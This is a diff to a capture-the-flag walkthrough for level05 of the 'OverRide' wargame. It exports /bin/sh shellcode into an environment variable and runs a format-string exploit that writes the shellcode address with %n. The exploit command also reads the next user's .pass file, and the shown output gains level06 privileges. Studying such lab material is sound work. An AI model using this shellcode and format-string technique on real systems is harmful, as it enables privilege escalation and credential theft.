@@ -71,6 +71,15 @@ aaaabbbb00000064 f7fcfac0 f7ec3add ffffd6df ffffd6de 00000000 ffffffff ffffd764 
 
 Export [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php) into environment variables and  retrieve the address where it is lay.
 
+
+Copy/paste chunk of code present in [addendum](https://github.com/42lan/override/tree/main/level05#addendum), compile it using 32-bit option, run to get address of environment variable.
+```shell
+level05@OverRide:~$ export SHELL_CODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+level05@OverRide:~$ gcc -m32 -o /tmp/getenv /tmp/getenv.c
+level05@OverRide:~$ ./getenv SHELL_CODE
+SHELL_CODE at 0xffffdedb
+```
+
 Devide the address per byte  and calculate for each number of characters that need to be printen by `%x` and written by `%n`.
 ```
 0xffffdedb
@@ -79,12 +88,8 @@ Devide the address per byte  and calculate for each number of characters that ne
 0xff -> 0x1ff-16-259-203 = 33
 0xff -> 0x2ff-16-259-203-33 = 256
 ```
-
 ## Exploit
 ```shell
-level05@OverRide:~$ export SHELL_CODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
-level05@OverRide:~$ ./getenv SHELL_CODE
-SHELL_CODE at 0xffffdedb
 level05@OverRide:~$ (python -c 'import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e1) + struct.pack("I", 0x080497e2) + struct.pack("I", 0x080497e3) + "%203x%10$n" + "%259x%11$n" + "%33x%12$n" + "%256x%13$n")'; echo 'id; cat /home/users/$(whoami)/.pass') | ./level05
                                                                                                                                                                                                          64                                                                                                                                                                                                                                                           f7fcfac0                         f7ec3af9                                                                                                                                                                                                                                                        ffffd65f
 uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
